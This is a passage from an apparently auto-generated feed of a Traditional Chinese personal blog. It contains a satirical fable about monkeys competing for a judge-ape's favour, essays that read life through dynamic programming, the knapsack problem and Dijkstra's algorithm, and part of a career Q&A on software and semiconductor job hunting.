        <content type="html"><![CDATA[<p>在一座高聳入雲的山上，住著一群猴子，猴子們都追逐著一個夢想，那就是，上等的香蕉。猴子們常常在山上討論：你是追求上等蕉的猴子，還是甘願無止盡地等待平凡香蕉的猴子呢？</p><p><img src="/img/monkey.webp"></p><p>有天，山上來了隻評審猿，評審猿說服猴子們來進行香蕉重分配的活動，過程之中評審猿會依照猴子們能被看見的表現，定期或不定期配發更多香蕉給表現優異的猴子，這讓猴子們更加努力地展現自己的才能。</p><p>猴子們，漸漸學會在評審猿的評比中，透過凸顯自己的定位與價值來獲得更多香蕉。猴子們也在程序猿的協助下，建立起猴聯網的機制，確保猴群的運作更加高效。</p><p>評審猿告訴猴子們，追求香蕉的過程中，最重要的不是香蕉本身，而是你如何展現自己的才華。評審猿的話讓猴子們深受啟發，於是猴子們開始了「山上猴子的養成計畫」。</p><h2 id="阻礙與成長"><a href="#阻礙與成長" class="headerlink" title="阻礙與成長"></a>阻礙與成長</h2><p>山上猴子的養成計畫過程中，猴子需要盡可能的了解山上的一花一草一世界，就連在路上的坑坑洞洞，都很可能是前輩們為了提醒後輩們留下的愛心。</p><p>計畫中不管是老猴子或小猴子，都只想著努力的爭取評審猿眼光，或許是靠搬運香蕉的時候多扭幾下屁股，或是搬完香蕉後來一段霹靂舞，漸漸的猴子的花邊技能需求開始快速上升。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/7JzYguOt3-c?si=ihQC__uudjRB0YmI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>隨著時間的推移，猴群的規模越來越大，猴群開始出現權力與資源的爭奪，老謀深算的猴子們漸漸開始不滿足而需要更多的空間，卻也因為活動能力變得緩慢而佔用了大量的資源。</p><p>新來的小猴子們充滿活力，卻因為太急著想進入猴群而遭到資源的排擠，畢竟新來的猴子隨便在路上走都會因為坑洞而跌倒，該怎麼做才能夠幫得上老猴子們的忙呢?</p><blockquote><p>這讓小猴子們開始思考：真正有資源的生物，怎麼會選擇到山上當猴子？</p></blockquote><p>在這個山上的猴子養成計畫中，小猴子們面臨著競爭激烈的環境和各種挑戰。資源的排擠、老一輩的權力鬥爭以及環境中的隱患，無形中都影響著小猴子們的成長。</p><p>儘管過程充滿阻礙和困難，小猴子們仍渴望在猴群中找到自己的定位和價值。究竟是什麼驅使猴子們選擇在這樣的環境中奮鬥？這不僅是對資源的認知與探索，更是對自我價值的追尋。</p><p>猴子們的努力和創新，反映了不斷學習和適應的重要性。在資源有限的情況下，需要一邊避開坑洞，一邊學習如何在鬥爭與合作中，運用自己的能力來促進自身和團體的成長，並在變化萬千的山中找到屬於自己的位置。</p><blockquote><p>其中有一個有趣的問題：在選擇阻礙與未來的可能性之間，該如何取捨？</p></blockquote><h2 id="演技與合作"><a href="#演技與合作" class="headerlink" title="演技與合作"></a>演技與合作</h2><p>隨著人類教會猴子說話，他們開始演化出了說話的藝術，這讓猴子們在爭鬥中有了更多的選擇。有些猴子漸漸演化成了戲精猿，學會了用巧妙的策略和表達來獲得香蕉。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/XaN3kUz4KSw?si=CpwIqJhOqCeY8CJG" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>戲精猿在追求利益的過程中，無形中增加了對演技和表現的重視，變得愈加精於表現自己的優勢，想讓評審猿看見的努力成果。</p><p>最佳演猿則是戲精猿中的翹楚，表現總是能引起評審猿的注意，進而贏得讚賞和資源，便成為猴群中最具影響力的角色之一，儘管表現往往是為了博取評審猿的認可。</p><p>言語演化象徵著技能與表達能力的提升，猴子們則依賴這些能力在漸漸擴大的組織中立足，最佳演猿的出現像一面鏡子，折射出那些精妙操控表現的影響與資源取得能力。</p><p>光彩背後，卻隱藏著競爭的黑暗面，為了獲得評審猿的青睞，讓真誠的連結在利益面前顯得脆弱。</p><p>然而，這種競爭的本質讓猴群的劣根性逐漸浮現，許多猴子為了獲得評審猿的青睞，僅止於表面上的合作和讚賞，背後都是為了引起評審猿的注意，最終造成整個群體的道德基礎逐漸崩潰。</p><blockquote><p>追求成功的過程中，是否已經犧牲了真正的價值？當外在的評價成為唯一的追求時，內心的滿足與成就感又該從何而來？</p></blockquote><p>並非所有的猴子都能適應這種變化。有些猴子依然固守傳統，無法打破自身的局限，因此在爭鬥中失去了機會，無論多麼努力，不懂適應就得面臨失敗的下場。</p><p>競爭與合作之間的微妙平衡，挑戰著猴子們的反思與適應和學習能力。</p><h2 id="猴聯網的真相"><a href="#猴聯網的真相" class="headerlink" title="猴聯網的真相"></a>猴聯網的真相</h2><p>隨著猴群的擴大，猴子們在面對困難時逐漸演化出了一種稱為「猴聯網」的合作模式。</p><p>誰能想像，猴子們在面對困難時，居然能依賴猴聯網這種充滿理想的合作模式？當意外或災難來臨時，猴聯網便會啟動，猴子們自發組織前往解決問題。</p><p>在適應猴聯網的過程中，猴子們逐漸演化成為程序猿，程序猿需要身體健康和能夠持續的勞動，若條件無法滿足，則會變回猴子。</p><p>程序猿負責處理各種事務，涵蓋從採集香蕉到妥善保存的整個流程，並透過猴聯網的機制確保猴子們都順利獲得香蕉，使猴群的生活運行流暢。</p><p>隨著猴群的擴大，總會有一些猴子無法演化成戲精猿或程序猿，但說話的藝術也讓這些猴子們找到了另外一個生存方法，那就是不負責任的傳達訊息，逐漸演化成為傳播猿，傳播猿的關鍵在於掌握重要資訊並有效佈達。</p><p>然而，資訊卻在多層傳播中變得愈加失真。過程中猴子們會出現主觀解讀、溝通障礙、選擇性表達、資訊過載、以及刻意扭曲的情況，這些都會使得訊息偏離原本的樣貌。</p><p>當時的猴子們都深信不疑，這就是猴子世界的真理。</p><p>因此，山上時常會爆發猴聯網也無法解決的「猴猴危機」，畢竟身為猴子，做蠢事是不分出生的。在等待評審猿審判前，平時各自為政猴子們不得不合作，這時猴子們終於明白只有團結才能抵禦外來的威脅。</p><blockquote><p>Apes alone…weak! Ape together…strong!</p></blockquote><h2 id="又回到最初的猿點"><a href="#又回到最初的猿點" class="headerlink" title="又回到最初的猿點"></a>又回到最初的猿點</h2><p>隨著猴群的擴大，評審猿漸漸無法辨識出猴子們的樣子，甚至連戲精猿、傳播猿和程序猿的角色也變得模糊不清，當無法得到評審猿的青睞，猴子們彷彿回到了最初的猿點，有沒有進化彷彿區別不大。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/xWzlwGVQ6_Q?si=z8CBLzzLutu9zPVb" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>猴子們從一開始的懵懂，到後來的混亂，再到努力尋找自己的定位。戲精猿、傳播猿和程序猿，似乎都在為了贏得評審猿的青睞而展現各自的才華，卻最終淪為無名猴子。</p><p>隨著時間的推移，戲精猿、傳播猿和程序猿中逐漸演化出管理猿，管理猿懂得如何實現效益最大化。藉助管理猿的協助，猴群開始出現各自的領地和聚落：戲精猿聚落擅長塑造對外形象、傳播猿聚落精於口才、程序猿聚落則專注於事務處理。</p><p>評審猿漸漸對於聚落之間的分工初具雛形感到滿意，便指派身邊的親信成為計分猿。在猴子的日常生活中，計分猿化身為普通猴子，當發現錯誤時，便立即出現進行提醒和計分。</p><p>在下一次評比中，評審猿將根據此次錯誤的影響範圍扣分。如果是曾經提過的問題，則會加倍扣分，計分猿則漸漸成為一隻善於落井下石的猴子。</p><p>當分數被扣到零分時，戲精猿、傳播猿和程序猿又會變回普通猴子，這時候猴子都會唱起一首歌來抒發當時的心情 「又回到最初的猿點，計分猿你機掰的臉」。猴子們開始意識到，從開始到放棄，從動手到動嘴，猴群中的合作與演技才是在龐大猴群中生存的關鍵。</p><p>當猴子們唱起 「又回到最初的猿點」時，回到起點的勇氣也許才是這些初出茅廬的猴子最應該學習的功課。</p><p>無論是年長的老猴子還是年輕的小猴子，在日復一日的山上生活中，猴子們可能會在這場演出中感到迷失，但最後再回到原點時，該是那個時候好好問問自己。</p><blockquote><p>我是一隻什麼樣的猴子？該成為什麼樣的猴子？究竟又該屬於哪一個聚落？ 在山上又該要扮演什麼角色？</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 山上猴子的故事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生動態規劃的生活哲學</title>
      <link href="/2025/05/28/life-thinking-algorithm/dynamic-programming-in-life/"/>
      <url>/2025/05/28/life-thinking-algorithm/dynamic-programming-in-life/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安，今天我們要來聊聊演算法界的隱藏王者：動態規劃（Dynamic Programming，簡稱 DP）。</p><p>很多人一聽到 DP 就直接投降，但其實 DP 就像打怪練等一樣，只要掌握核心精神，就會發現：它就是你早就在做的事，只是沒寫成表格罷了。</p><h2 id="💥-什麼是動態規劃？"><a href="#💥-什麼是動態規劃？" class="headerlink" title="💥 什麼是動態規劃？"></a>💥 什麼是動態規劃？</h2><p>簡單來說：</p><blockquote><p>「我現在要做的決策，能不能靠過去的最佳經驗來做選擇？」</p></blockquote><p>再白話一點：</p><blockquote><p>你打怪升級，不會每次都從 LV1 砍到 LV99，而是記住每次升級的過程，把經驗值存起來，下次不用重頭再來。</p></blockquote><h3 id="每一步都記起來，才不會白走"><a href="#每一步都記起來，才不會白走" class="headerlink" title="每一步都記起來，才不會白走"></a>每一步都記起來，才不會白走</h3><p>想像你玩 RPG：</p><ul><li>初始血量 100</li><li>每條路徑上會遇到怪物、補包或陷阱</li><li>目標是走到終點血量還活著</li></ul><p>這時候你會怎麼辦？</p><ol><li>嘗試每一條路？</li><li>每次重走都重新計算？</li></ol><p>不，你會記住：哪條路會損多少血、哪個角落有補包，然後把「過去最佳走法」存起來，這就是 DP！</p><h2 id="🧠-DP-的兩大核心精神"><a href="#🧠-DP-的兩大核心精神" class="headerlink" title="🧠 DP 的兩大核心精神"></a>🧠 DP 的兩大核心精神</h2><ol><li>重複子問題（subproblems）：很多問題其實只是原問題的縮小版，學習 React 不用重學 JavaScript（因為你已經解過那個子問題）</li><li>最優子結構（optimal substructure）：整體最優 &#x3D; 局部最優的組合，理想的人生，也許不是一次完成，而是每階段的最好選擇累積出來的。</li></ol><p>就像人生中應該盡可能早的談戀愛?早點失戀，就能夠更早成為更好的大人?</p><h2 id="🧬-DP-是你的人生筆記"><a href="#🧬-DP-是你的人生筆記" class="headerlink" title="🧬 DP 是你的人生筆記"></a>🧬 DP 是你的人生筆記</h2><p>是不是在生活中也常這樣：</p><ul><li>跟主管開會時踩雷，下次就記下來「不能直接說不」</li><li>約會時失言，就提醒自己「不要聊前任」</li><li>專案踩雷後產生 checklist，之後照著走就沒事</li></ul><p>這些經驗筆記，其實都是生活版本的 DP 表格，這也就是傳說中的先做好一版，再做 CIP 的道理。</p><p>每一次錯誤，其實都值得記下來</p><ul><li>走過一段錯的感情，那是你情感地圖的一部分。</li><li>做過不適合的工作，下次投履歷就會更快看懂「這間不適合我」。</li></ul><p>成熟不是避免錯誤，而是走過一次、記得一次。</p><p>有時候我們不是做錯選擇，而是忘記自己曾經犯過一樣的錯。</p><p>DP 的本質就是「不重走錯誤的路，持續更新更好的選擇」。</p><p>打怪如此，寫程式如此，人生何嘗不是?</p><h2 id="📚-延伸閱讀"><a href="#📚-延伸閱讀" class="headerlink" title="📚 延伸閱讀"></a>📚 延伸閱讀</h2><ul><li><a href="https://linyencheng.github.io/2024/10/27/life-thinking-algorithm/binary-search-in-life/">人生的 Knapsack 背包，我的人生裝得下什麼？</a></li><li><a href="https://linyencheng.github.io/2024/10/06/life-thinking-algorithm/greedy-algorithm-for-your-life/">人生的貪婪演算法，你想的最佳解也許不是真的最佳解又如何</a></li><li><a href="https://linyencheng.github.io/2024/10/27/life-thinking-algorithm/binary-search-in-life/">人生的二分搜尋法，為什麼喜歡的演唱會總是聽一場少一場?</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人生演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生的 Knapsack 背包</title>
      <link href="/2025/05/28/life-thinking-algorithm/knapsack-in-life/"/>
      <url>/2025/05/28/life-thinking-algorithm/knapsack-in-life/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安，今天我們來聊一個經典又讓人內心動搖的問題：Knapsack Problem（背包問題）。</p><p>在演算法課上，它是一道讓學生覺得空虛的題目；但在人生中，卻是一個我們天天都在面對的選擇：</p><blockquote><p>我有一個容量有限的背包，究竟要裝進什麼？</p></blockquote><h2 id="🔍-Knapsack-Problem-是什麼？"><a href="#🔍-Knapsack-Problem-是什麼？" class="headerlink" title="🔍 Knapsack Problem 是什麼？"></a>🔍 Knapsack Problem 是什麼？</h2><p>你有一個背包，容量是 W，你面前有 N 個物品，每個物品有重量和價值。</p><p>問題是：在不超過背包容量的前提下，怎麼選物品讓總價值最大？</p><p>舉例來說：</p><table><thead><tr><th>物品</th><th>重量</th><th>價值</th></tr></thead><tbody><tr><td>書本</td><td>3kg</td><td>$60</td></tr><tr><td>筋膜槍</td><td>2kg</td><td>$40</td></tr><tr><td>鍋具組</td><td>4kg</td><td>$70</td></tr><tr><td>Switch</td><td>1kg</td><td>$30</td></tr></tbody></table><p>背包只能裝 5 公斤，你會怎麼選？</p><blockquote><p>是裝一整組鍋具，還是帶著 Switch 和書本，一邊煮泡麵一邊打薩爾達？</p></blockquote><h2 id="🧠-演算法怎麼解？"><a href="#🧠-演算法怎麼解？" class="headerlink" title="🧠 演算法怎麼解？"></a>🧠 演算法怎麼解？</h2><p>這是個典型的動態規劃問題。</p><p>因為你不能光看「單一物品的價值」，而是要考慮組合之間的搭配。</p><blockquote><p>當你有太多選擇、太少空間，這時「貪婪」反而不靈了。</p></blockquote><p>不像<a href="https://linyencheng.github.io/2024/10/06/life-thinking-algorithm/greedy-algorithm-for-your-life/">貪婪演算法</a>那樣只看當下最好，而是記錄每個重量下的最大價值，一層一層地推進，逐步逼近最好的組合，這種方法，不正像我們活在選擇焦慮的現代人？</p><p>每一份工作都是為了下一份工作?每一個現在的犧牲和努力都是為了未來?</p><h2 id="🧳-人生就是一場背包問題"><a href="#🧳-人生就是一場背包問題" class="headerlink" title="🧳 人生就是一場背包問題"></a>🧳 人生就是一場背包問題</h2><p>想想你現在的生活：</p><ul><li>時間有限（每週只有 168 小時）</li><li>體力有限（一天只能做幾件深度工作的事）</li><li>注意力有限（訊息爆炸到讓人焦慮）</li></ul><p>那麼問題來了：你要裝進什麼？</p><ul><li>看 Netflix 還是寫 side project？</li><li>學 React 還是學生成式 AI？</li><li>交新朋友，還是回頭整理自己的情緒？</li></ul><p>我們總以為自己可以全都要，但事實是：</p><blockquote><p>背包只有這麼大，裝了 A，就裝不下 B。</p></blockquote><p>雞湯文來一篇:</p><p>你的人生終究是個小丑，你會有很多顆球需要不停地拋接。</p><p>隨著年紀漸長你會發現，大多數的球都是橡皮做的，有幾顆卻是玻璃做的。</p><p>大多數的球掉下後都能夠彈的回來，有幾顆卻無法。</p><h2 id="🤯-難的從來不是選擇，而是捨棄"><a href="#🤯-難的從來不是選擇，而是捨棄" class="headerlink" title="🤯 難的從來不是選擇，而是捨棄"></a>🤯 難的從來不是選擇，而是捨棄</h2><p>背包問題真正的難點，不是怎麼拿最多的東西，而是要學會：</p><ul><li>什麼對你真的有價值？</li><li>那些看起來很重、但其實沒價值的東西，能不能放下？</li><li>你背的，是自己的選擇，還是社會給你的 KPI？</li></ul><p>這些才是人生的 Knapsack 的核心。</p><p>有時候，我們為了「不浪費」學過的技能、交過的朋友、打下的基礎，反而捨不得放下。</p><blockquote><p>但演算法教我們：不是已經投入的就一定值得，重點是未來的價值。</p></blockquote><h2 id="🧘-滿足-≠-成就"><a href="#🧘-滿足-≠-成就" class="headerlink" title="🧘 滿足 ≠ 成就"></a>🧘 滿足 ≠ 成就</h2><p>這幾年我也開始學著用「價值密度」來看自己的人生選擇：</p><ul><li>花 2 小時跟朋友吃飯，也許價值比刷 4 小時社群還高。</li><li>一個月薪 15 萬的工作，扣掉通勤、壓力、身心耗損，也許還不如月薪 6 萬但能自由安排時間的生活。</li></ul><p>成就感（來自外部）、滿足感（來自內部），可能根本裝在兩個不同的背包裡。</p><h2 id="該是時候給你的人生寫個動態規劃"><a href="#該是時候給你的人生寫個動態規劃" class="headerlink" title="該是時候給你的人生寫個動態規劃"></a>該是時候給你的人生寫個動態規劃</h2><p>別再只是「先拿最近看到的最閃亮的東西」了。<br>給自己一些時間，列出選項，計算代價，思考組合。</p><p>人生的背包問題沒有唯一解，但你可以選擇自己計算出來的答案，而不是別人塞給你的。</p><p>你呢? 你的 Knapsack 人生的背包裝得下什麼?</p><h2 id="📚-延伸閱讀"><a href="#📚-延伸閱讀" class="headerlink" title="📚 延伸閱讀"></a>📚 延伸閱讀</h2><ul><li><a href="https://linyencheng.github.io/2025/05/28/life-thinking-algorithm/dynamic-programming-in-life/">人生動態規劃的生活哲學，打怪升級不是靠天賦是靠什麼?</a></li><li><a href="https://linyencheng.github.io/2024/10/06/life-thinking-algorithm/greedy-algorithm-for-your-life/">人生的貪婪演算法，你想的最佳解也許不是真的最佳解又如何</a></li><li><a href="https://linyencheng.github.io/2025/08/09/kimetsu-no-yaiba/rengoku-kyoujurou-be-true-be-you/">成為自己看得起的大人: 那些鬼滅告訴我的事情</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人生演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你的 Dijkstra 路徑真的有比較快嗎?</title>
      <link href="/2025/05/28/life-thinking-algorithm/shortest-path-in-your-life/"/>
      <url>/2025/05/28/life-thinking-algorithm/shortest-path-in-your-life/</url>
      
        <content type="html"><![CDATA[<p>各位大大安安，今天我們來聊聊一個既簡單又不簡單的問題：我這輩子到底要怎麼走，才是最快到達理想人生的路？</p><p>你可能會說：「那不是看命嗎？」但演算法告訴我們：其實可以算出來——這就是最短路徑演算法（Shortest Path Algorithm）。</p><p>不過你的 Dijkstra 路徑真的有比較快嗎?抉擇是為了走的快，還是走的滿足?</p><h2 id="🛤️-最短路徑演算法是什麼？"><a href="#🛤️-最短路徑演算法是什麼？" class="headerlink" title="🛤️ 最短路徑演算法是什麼？"></a>🛤️ 最短路徑演算法是什麼？</h2><p>舉個例子，Dijkstra 演算法告訴我們：</p><p>從起點出發，計算到每一個節點的最短距離，並持續更新直到抵達終點。</p><p>注意兩件事：</p><ul><li>每條路的距離不同（人生中每條選擇的代價也不同）</li><li>不一定直線最短（有時候繞一下反而更快）</li></ul><p>物理中的最速降線</p><iframe width="560" height="315" src="https://www.youtube.com/embed/Bh6-zKwTupc?si=re4i2O_b5ZQiE3tI" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><h2 id="🎓-生涯選擇的圖論"><a href="#🎓-生涯選擇的圖論" class="headerlink" title="🎓 生涯選擇的圖論"></a>🎓 生涯選擇的圖論</h2><p>想像人生是一張圖：</p><ul><li>每個節點是一段經歷：大學、第一份工作、轉職、創業、放空…</li><li>每條邊是轉換：從 A 到 B 要花幾年、多少代價、多少心力</li><li>目標：從現在的你，到你理想的樣子</li></ul><p>你會發現，人生根本不是線性「讀書 → 就業 → 升遷」，而是：</p><blockquote><p>一張巨大的圖，每個人都在不同的節點，問著：『我該怎麼走？』</p></blockquote><h2 id="🧭-問題是：你知道終點在哪嗎？"><a href="#🧭-問題是：你知道終點在哪嗎？" class="headerlink" title="🧭 問題是：你知道終點在哪嗎？"></a>🧭 問題是：你知道終點在哪嗎？</h2><p>很多人在人生地圖裡亂走，是因為：</p><ul><li>沒有明確的終點（不知道自己要什麼）</li><li>以為別人的終點就是自己的（盲目追求高薪、頭銜）</li><li>看不到邊的代價（轉職需要的學習時間、創業的壓力）</li></ul><blockquote><p>沒有終點，最短路徑也沒有意義。</p></blockquote><h2 id="⛏️-Dijkstra：一步步更新你的地圖"><a href="#⛏️-Dijkstra：一步步更新你的地圖" class="headerlink" title="⛏️ Dijkstra：一步步更新你的地圖"></a>⛏️ Dijkstra：一步步更新你的地圖</h2><p>在 Dijkstra 中，我們會做兩件事：</p><ol><li>先選擇當前已知最短的路徑節點</li><li>透過它更新其他節點的可能性</li></ol><p>在人生中也一樣：</p><ol><li>先做好當下最清楚的一步（例如學好 JavaScript）</li><li>再根據這一步，打開更多的可能（前端、全端、開課、創業）</li></ol><p>別小看這一步，它不一定是最有光環的選項，但它是讓地圖更新的起點。</p><h2 id="💬-有時候走錯路也沒關係，因為你學會了「邊的成本」"><a href="#💬-有時候走錯路也沒關係，因為你學會了「邊的成本」" class="headerlink" title="💬 有時候走錯路也沒關係，因為你學會了「邊的成本」"></a>💬 有時候走錯路也沒關係，因為你學會了「邊的成本」</h2><p>每條路都是一筆資料，你可以不走，但你不能不知道它的代價。</p><p>像我即使選了某份高薪但不自由的工作，身體也變得不怎麼健康，後來可能就離開了，但過程中我學會了自己的忍耐極限，也學會了怎麼設定邊的 cost。</p><p>這筆學費很貴，但會讓我未來的地圖更準確。最短路徑的意義，不是走最少的步，而是走出最符合價值的走法。</p><p>有人走彎路，結果找到自我;有人走直線，卻在終點迷路;最終，不是去哪，也許有沒有畫過自己的地圖?</p><h2 id="📚-延伸閱讀"><a href="#📚-延伸閱讀" class="headerlink" title="📚 延伸閱讀"></a>📚 延伸閱讀</h2><ul><li><a href="https://linyencheng.github.io/2024/10/27/life-thinking-algorithm/binary-search-in-life/">人生的二分搜尋法，為什麼喜歡的演唱會總是聽一場少一場?</a></li><li><a href="https://linyencheng.github.io/2024/10/06/life-thinking-algorithm/greedy-algorithm-for-your-life/">人生的貪婪演算法，你想的最佳解也許不是真的最佳解又如何</a></li><li><a href="https://linyencheng.github.io/2025/05/28/life-thinking-algorithm/dynamic-programming-in-life/">人生動態規劃的生活哲學，打怪升級不是靠天賦是靠什麼?</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人生演算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 職涯發展 </tag>
            
            <tag> 個人成長 </tag>
            
            <tag> 軟體工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你是忘記了還是害怕想起來</title>
      <link href="/2025/01/21/career/experience-sharing-tsmc-job/"/>
      <url>/2025/01/21/career/experience-sharing-tsmc-job/</url>
      
        <content type="html"><![CDATA[<p>小編受到 104 的邀請，即將在年後 2025.02.11 (二) 19:30 ~ 21:00 舉辦一場線上的免費 QA 活動。好奇在半導體產業的日常工作是什麼樣？想知道面試的題目和流程、職涯秘辛，還是職涯規劃？歡迎各位大大提早報名，並在報名表中填上想要討論的問題。</p><blockquote><p><a href="https://tw104.pse.is/6yayls">https://tw104.pse.is/6yayls</a></p></blockquote><p>三個失敗的決定</p><ol><li>在高速成長期選擇悠哉過生活。</li><li>太晚累積英文能力，還無法進入外商公司。</li><li>職涯初期沒到台北，錯過提早探索的機會。</li></ol><p>三個成功的決定</p><ol><li>參與各種社群與不同領域朋友們交流學習。</li><li>在十年前選擇轉換前端 Reactjs 這個賽道發展。</li><li>偏 I 人，但經營部落格 MAU 5000+ 算還可以。</li></ol><iframe src="https://docs.google.com/presentation/d/e/2PACX-1vTJmLNoFlFrYcXFAbghnh4EEOqgQdK4xREkMlRKQqYdD-m_bR3O15yAGOtWCpbX9Fctr_MrNU82fIv1/embed?start=false&loop=false&delayms=3000" frameborder="0" width="480" height="299" allowfullscreen="true" mozallowfullscreen="true" webkitallowfullscreen="true"></iframe><h2 id="面試與履歷準備"><a href="#面試與履歷準備" class="headerlink" title="面試與履歷準備"></a>面試與履歷準備</h2><p>開的缺就是希望你長的跟前一位轉職員工越像越好，但實際上當然不可能，就跟談戀愛要遇到真命天子&#x2F;天女是一樣的道理，可遇不可求。</p><p>優化履歷前要先懂診斷履歷，履歷的好壞簡單說就是和 JD (Job Desription) 的符合程度，當履歷符合市場上的需求之後，接著就是<a href="https://linyencheng.github.io/2020/08/17/thinking-resume/">依照履歷的受眾來進行相關優化</a>。</p><p>履歷的曝光有時候是一個機緣，重要的還是平常的累積。就跟談戀愛一樣，在對的時間遇見對的人，也要你剛好準備好才行。可能組織改組中只是時機問題？或是學歷被HR卡關但老闆實際不在意？</p><p>依照年資來分，我會將準備分為三個階段：學生階段、新鮮人階段、高齡求職</p><h3 id="履歷準備"><a href="#履歷準備" class="headerlink" title="履歷準備"></a>履歷準備</h3><p>履歷如何吸引人資?如何讓履歷更亮眼?怎樣比較容易被主管撈到履歷?</p><p>要寫得像是職缺描述的複製品，雖然大多無法完全符合，但這是求職的一部分。</p><p>履歷曝光是機緣，所以平時積累很重要，我建議每半年都可以更新一次流水帳式很細節的履歷，投遞前再修改即可，考績都可以是作文比賽，履歷何嘗不是。</p><p>在對的時間，遇見對的人，才能打動 HR 或老闆。</p><h3 id="面試準備"><a href="#面試準備" class="headerlink" title="面試準備"></a>面試準備</h3><p>面試技巧?面試流程?面試準備方向?軟體工程師面試時會看重哪方面?可以放什麼樣的專案才有加分?面試時如何提高成功率?</p><p>建議多參加面試，像是演戲需要不斷練習，才能流暢且自信。</p><p>我寫履歷其實普通還請人修改過，但我的 SEO 做得不錯，可以 Google 我的名字或 Reactjs 看看，有些軟體工程問題就會被跳過。</p><p>學生、新鮮人、資深等不同的階段我認為可以有不同的方式。</p><h3 id="學生階段求職"><a href="#學生階段求職" class="headerlink" title="學生階段求職"></a>學生階段求職</h3><p>想請問如果現在身分仍為學生，可以加強什麼部份以提高自身能力呢?</p><p>努力提升語言能力，積極參加實習，並與校友及學長姐建立良好的關係。許多職位可能來自於隨意的交流。</p><p>另外，參加 IT 幫幫忙鐵人賽，也是一個很好的選擇，我沒有很強的實際經驗可以說嘴，但是我針對網站開發寫了 90 篇以上的技術文章。</p><p>年紀跟學歷會在HR階段就被刷掉嗎?學歷與組別的重要性?學歷是不是比較重要呢🤔軟體工程師會很注重學歷嗎?</p><p>大缺人的時候，念藝術相關類別的可能也可以進來 IT 部門做 UIUX，而且升資深的職等也不會看有沒有研究所學歷。</p><p>不管科目是否相關，有機會可以拿一個頂大理工碩士 (專班也沒有關係)，畢竟是用學歷來給職等跟簽約獎金的公司。</p><p>軟體公司正常不太看學歷，但工廠在還無法評估你的能力前，比起實務經驗會更重視學歷一點。</p><p>非相關背景的人需要準備哪些東西?除了刷題，還需準備什麼？</p><p>我大學讀的是工程科學系，與現在的前端工程師的工作並不相關。</p><p>因此，在學習時，程式語言本身並不是最重要的，真正關鍵的是理解核心概念以及能解決問題的能力。</p><ul><li>閱讀而不只是只識字</li><li>搜尋而不只是被推播 </li><li>寫作而不只是只輸入</li><li>實作而不只是只空想</li></ul><p>面試考題難度是否有進行調整?需要準備 leetcode 嗎?</p><p>現在的軟體工程師職場競爭激烈，刷題變得相當重要。</p><p>如果老闆希望雇用你，可能會要求你通過面試 leetcode 題目。</p><p>面試難度取決老闆是否迫切需要你。</p><h3 id="新鮮人階段求職"><a href="#新鮮人階段求職" class="headerlink" title="新鮮人階段求職"></a>新鮮人階段求職</h3><p>請問目前AI或ML的工程師會有新鮮人的機會嗎？如果有的話除了刷題外還建議如何準備履歷及面試呢？</p><p>若經驗不足，可以依賴學歷。</p><p>大公司篩選時學歷比較容易成為篩選條件，畢竟人資未必能完全理解你的 GitHub。</p><p>再來就是可以參加 IT 幫幫忙鐵人賽，我寫了好幾屆了，也可以多參與社群跟研討會，報名當志工會是非常不錯的體驗。</p><p>非相關產業背景的有機會嗎?非相關背景的人自學轉職軟體工程師?30 +非本科求職者面試有需要注意哪些細節?非相關背景面試前需要精進或準備哪些東西?</p><p>跨領域轉職的難度比以往大。</p><p>轉職者可能需要先在小公司積累經驗，建立作品集。</p><p>舉例來說，我之前的部門同事，有幾位來自北一女和頂大的同學，前公司給我負責帶的也是非相關科系，但也是建中然後台大畢業。</p><p>你必須思考自己與他們相比的競爭力在哪裡。</p><h3 id="高齡求職"><a href="#高齡求職" class="headerlink" title="高齡求職"></a>高齡求職</h3><p>有 3 年以上軟體工作經歷但非相關學歷背景，年齡較大會在一開始投履歷的時候就被刷掉嗎?</p><p>這時候，需要展現出更豐富的經驗和影響力，而不僅僅是做 CRUD。</p><p>擁有工作經驗的人學起來比較快，但若經驗不足，優勢就不明顯。</p><p>基層老闆大多在 35-40 歲之間，在找下屬時，大多會偏向年資較少的人。</p><p>如果年齡較大，可以透過內推更快找到工作。</p><p>是否有年齡限制？年齡要多少以下?</p><p>在工程師的職涯發展中，會遇到年齡的天花板。雖然業界普遍宣稱沒有年齡歧視，但每家公司內的員工年齡結構仍會有一定的區間。</p><p>最重要的能力是能持續學習新事物。就像水族館裡的海豹，雖然身處安全的環境，但也不能忘記在野外如何覓食。</p><p>有能力的資深員工通常會轉至外商，因為外商普遍較不依年齡或性別篩選人才，履歷上也相對不建議標註相關資訊。</p><p>軟體工程師的年資與能力未必正相關，畢竟很難找到一位有 20 年 iOS 經驗的工程師，但資料庫管理師卻可以找到。所以，選擇合適的職涯道路非常重要。</p><p>舉例來說，能設計出 